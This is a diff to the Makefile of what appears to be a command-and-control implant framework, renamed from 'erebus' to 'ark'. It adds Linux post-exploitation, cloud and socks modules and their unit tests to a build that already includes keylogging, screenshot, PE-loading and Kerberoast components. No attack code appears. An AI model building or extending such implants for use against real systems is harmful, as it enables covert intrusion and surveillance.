@@ -11,6 +11,9 @@ BUILD_DIR     = ../build
 
 # Prefer openssl/python over xxd (often missing on minimal hosts).
 IMPLANT_ID     ?= $(shell openssl rand -hex 16 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(16))')
+# HMAC: this secret is NOT registered with the teamserver.
+# Use `ark inbound drop` or `ark op generate` so RegisterImplantSecret runs.
+# Bare `make` / `make implant-c-linux` will HMAC-reject at register.
 IMPLANT_SECRET ?= $(shell openssl rand -hex 32 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(32))')
 CALLBACK_URL   ?= https://127.0.0.1:443
 SLEEP_MS       ?= 5000
@@ -73,7 +76,10 @@ SRCS = $(COMMON_SRCS) \
 	src/tasks/process_linux.c \
 	src/tasks/network_linux.c \
 	src/tasks/tasks_linux_stub.c \
+	src/tasks/socks_linux.c \
 	src/modules/modules_linux.c \
+	src/modules/linux_postex.c \
+	src/modules/linux_cloud.c \
 	linux/main.c
 else
 CC       = x86_64-w64-mingw32-gcc
@@ -114,11 +120,12 @@ SRCS = $(COMMON_SRCS) \
 	src/tasks/screenshot.c \
 	src/tasks/keylog.c \
 	src/tasks/socks.c \
+	src/tasks/socks_api_stub.c \
 	src/tasks/peload.c \
 	windows/main.c
 endif
 
-.PHONY: all config clean test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-unique-ms test-host linux windows
+.PHONY: all config clean test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux test-host linux windows
 
 all: config $(OUT)
 
@@ -131,7 +138,7 @@ windows:
 # Host-side unit tests for pure logic (no mingw required).
 test-pathjail:
 	@mkdir -p $(BUILD_DIR)
-	cc -std=c11 -Wall -Wextra -Iinclude -DEREBUS_PATHJAIL_HOST_TEST \
+	cc -std=c11 -Wall -Wextra -Iinclude -DARK_PATHJAIL_HOST_TEST \
 		tests/pathjail_host_test.c src/tasks/pathjail.c -o $(BUILD_DIR)/pathjail_host_test
 	$(BUILD_DIR)/pathjail_host_test
 
@@ -155,6 +162,13 @@ test-ntlm-parse:
 		-o $(BUILD_DIR)/ntlm_parse_host_test
 	$(BUILD_DIR)/ntlm_parse_host_test
 
+test-socks-pb:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude \
+		tests/socks_pb_host_test.c src/pb/wire.c src/pb/c2.c src/tasks/socks_api_stub.c \
+		-o $(BUILD_DIR)/socks_pb_host_test
+	$(BUILD_DIR)/socks_pb_host_test
+
 test-unique-ms:
 	@mkdir -p $(BUILD_DIR)
 	cc -std=c11 -Wall -Wextra -Iinclude \
@@ -162,7 +176,44 @@ test-unique-ms:
 		-o $(BUILD_DIR)/unique_ms_host_test
 	$(BUILD_DIR)/unique_ms_host_test
 
-test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-unique-ms
+test-linux-cloud:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude -D_GNU_SOURCE \
+		tests/linux_cloud_host_test.c src/modules/linux_cloud.c \
+		-o $(BUILD_DIR)/linux_cloud_host_test -lssl -lcrypto
+	$(BUILD_DIR)/linux_cloud_host_test
+
+test-linux-postex:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude -D_GNU_SOURCE \
+		tests/linux_postex_host_test.c src/modules/linux_postex.c src/tasks/pathjail.c \
+		-o $(BUILD_DIR)/linux_postex_host_test
+	$(BUILD_DIR)/linux_postex_host_test
+
+test-linux-task-stubs:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude \
+		tests/linux_task_stubs_host_test.c src/tasks/tasks_linux_stub.c \
+		-o $(BUILD_DIR)/linux_task_stubs_host_test
+	$(BUILD_DIR)/linux_task_stubs_host_test
+
+test-task-dispatch:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude \
+		tests/task_dispatch_host_test.c src/tasks/executor.c \
+		-o $(BUILD_DIR)/task_dispatch_host_test
+	$(BUILD_DIR)/task_dispatch_host_test
+
+test-task-typed-linux:
+	@mkdir -p $(BUILD_DIR)
+	cc -std=c11 -Wall -Wextra -Iinclude -D_GNU_SOURCE \
+		tests/task_typed_linux_host_test.c src/tasks/executor.c src/tasks/stubs.c \
+		src/modules/modules_linux.c src/modules/linux_postex.c src/modules/linux_cloud.c \
+		src/tasks/pathjail.c src/pb/wire.c src/pb/c2_modules.c \
+		-o $(BUILD_DIR)/task_typed_linux_host_test -lssl -lcrypto
+	$(BUILD_DIR)/task_typed_linux_host_test
+
+test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-socks-pb test-unique-ms test-linux-postex test-linux-cloud test-linux-task-stubs test-task-dispatch test-task-typed-linux
 
 config:
 	@chmod +x scripts/gen_config.sh
@@ -176,11 +227,11 @@ config:
 	DNS_DOMAIN="$(DNS_DOMAIN)" \
 	DNS_SERVER="$(DNS_SERVER)" \
 	CDN_DOMAIN="$(CDN_DOMAIN)" \
-	./scripts/gen_config.sh include/erebus/config.h
+	./scripts/gen_config.sh include/ark/config.h
 
 $(OUT): config $(SRCS)
 	@mkdir -p $(BUILD_DIR)
 	$(CC) $(CFLAGS) $(SRCS) -o $(OUT) $(LDFLAGS)
 
 clean:
-	rm -f include/erebus/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c_linux
+	rm -f include/ark/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c_linux
